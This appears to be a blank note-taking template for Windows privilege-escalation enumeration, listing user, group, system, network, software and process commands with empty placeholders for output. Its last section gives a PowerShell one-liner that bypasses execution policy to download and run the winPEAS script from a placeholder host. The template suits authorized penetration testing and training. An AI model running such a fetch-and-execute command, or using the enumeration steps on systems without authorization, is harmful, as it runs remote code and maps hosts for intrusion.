# Windows

## System Information
### Username and Hostname
```powershell
whoami
```
```powershell
<insert hostname\username here>
```

### Group memberships of the current user
```powershell
whoami /groups
```
```powershell
<insert output here>
```

### Existing users and groups
- **Enumerating Users**
    ```batch
    net user
    ```
    ```batch
    <insert output here>
    ```
    ```powershell
    Get-LocalUser
    ```
    ```batch
    <insert output here>
    ```
- **Enumerating Groups**
    ```batch
    net localgroup
    ```
    ```batch
    <insert output here>
    ```
    ```powershell
    Get-LocalGroup
    ```
    ```powershell
    <insert output here>
    ```
    ```powershell
    Get-LocalGroupMember $GROUP
    ```
    ```powershell
    <insert output here>
    ```

### Operating system, version and architecture
- **System Information**
    ```batch
    systeminfo
    ```
    ```batch
    <insert output here>
    ```
- **Network Information**
    ```batch
    ipconfig /all
    ```
    ```batch
    <insert output here>
    ```
    ```batch
    route print
    ```
    ```batch
    <insert output here>
    ```
    ```batch
    netstat -ano
    ```
    ```batch
    <insert output here>
    ```
- **Installed Applications and Running Services**
    ```powershell
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    ```
    ```powershell
    <insert output here>
    ```
    ```powershell
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    ```
    ```powershell
    <insert output here>
    ```
    ```batch
    dir "C:\Program Files"
    ```
    ```batch
    <insert output here>
    ```
    ```batch
    dir "C:\Program Files (x86)"
    ```
    ```batch
    <insert output here>
    ```
    ```batch
    dir %USERPROFILE%\Downloads
    ```
    ```batch
    <insert output here>
    ```
    ```powershell
    Get-Process
    ```
    ```powershell
    <insert output here>
    ```

## Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```
```powershell
<insert winpeas output here>
```
